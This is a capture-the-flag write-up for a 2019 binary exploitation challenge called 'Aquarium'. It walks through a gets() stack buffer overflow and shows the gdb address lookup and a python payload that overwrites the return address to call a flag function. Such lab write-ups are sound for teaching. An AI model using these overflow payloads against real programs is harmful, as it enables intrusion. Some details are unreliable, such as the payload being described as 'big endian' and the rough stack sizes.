# Aquarium
###### Binary Exploitation - 50 Points

> Here's a nice little program that helps you manage your fish tank.
> Run it on the shell server at /problems/2019/aquarium/ or connect with nc shell.actf.co 19305.
> Author: kmh11

So we get the following C file and we are supposed to find the flag:

```c 
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

struct fish_tank {
	char name[50];
	int fish;
	int fish_size;
	int water;
	int width;
	int length;
	int height;
};


struct fish_tank create_aquarium() {
	struct fish_tank tank;

	printf("Enter the number of fish in your fish tank: ");
	scanf("%d", &tank.fish);
	getchar();

	printf("Enter the size of the fish in your fish tank: ");
	scanf("%d", &tank.fish_size);
	getchar();

	printf("Enter the amount of water in your fish tank: ");
	scanf("%d", &tank.water);
	getchar();

	printf("Enter the width of your fish tank: ");
	scanf("%d", &tank.width);
	getchar();

	printf("Enter the length of your fish tank: ");
	scanf("%d", &tank.length);
	getchar();

	printf("Enter the height of your fish tank: ");
	scanf("%d", &tank.height);
	getchar();

	printf("Enter the name of your fish tank: ");

	char name[50]; <<< VULN
	gets(name);    <<< VULN
	strcpy(name, tank.name);
	return tank;
}

int main() {
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);

	struct fish_tank tank;

	tank = create_aquarium();

	if (tank.fish_size * tank.fish + tank.water > tank.width * tank.height * tank.length) {
		printf("Your fish tank has overflowed!\n");
		return 1;
	}

	printf("Nice fish tank you have there.\n");

	return 0;
}
```

In the code we can spot 2 very critical lines(marked with arrows) which allow us to use a `buffer overflow` attack. 

So what do we want to do?
- We want to override the `name` variable.
- We want to change the return address to the `flag` function.

Let's begin by finding the `flag` function's address.

We can open the aquarium program in gdb and use `p flag` to get the address

```
Reading symbols from ./aquarium...
(No debugging symbols found in ./aquarium)
(gdb) p flag
$1 = {<text variable, no debug info>} **0x4011b6** <flag>
```

Let's try giving the program about 155 characters and see how it reacts:

```
$ python -c 'print ("1\n1\n10\n10\n10\n10\n" + "A" * 155)' | ./aquarium
$ Enter the number of fish in your fish tank: Enter the size of the fish in your fish tank: Enter the amount of water in your fish tank: Enter the width of your fish tank: Enter the length of your fish tank: Enter the height of your fish tank: Enter the name of your fish tank: Segmentation fault (core dumped) 
```

Oh, the program crashed. Well, what's actually going on is that we have overridden the return address, what caused the program to return to a faulty address.

Let's calculate (around) how many characters we would have to insert in order to insert a new return address:

Before we do that we need to understand how the stack is layed out, so the stack is a data type that starts out high valued and decreases with each push.
So stack will be layed out like this (once we get to the get function in the create_aquarium function)

| Stack         | Size          |
| ------------- | ------------- |
| name          | 50 bytes	|
| fish_tank	| 62 bytes      |
| junk 		| ?? bytes	|
| return address| 8  bytes 	|

To find out how big the junk / filler we just try out a few offsets until we dont override the return address.

So we found out that 152 is the correct amount of characters we would need to insert in order to start overriding the return address(which means the junk part is 31 bytes).

Now we can insert our desired address(don't forget to use big endian) and return to it:
```
$ python -c "print('1\n1\n10\n10\n10\n10\n' + 'A' * 152 + '\xb6\x11\x40\x00')" | ./aquarium
$ actf{overflowed_more_than_just_a_fish_tank}
```

Thanks for reading this writeup, it's my first one and I am sure I have big space for improvement, if you have some constructive feedback be sure to comment or send me an email @ sudaiguy1@gmail.com.
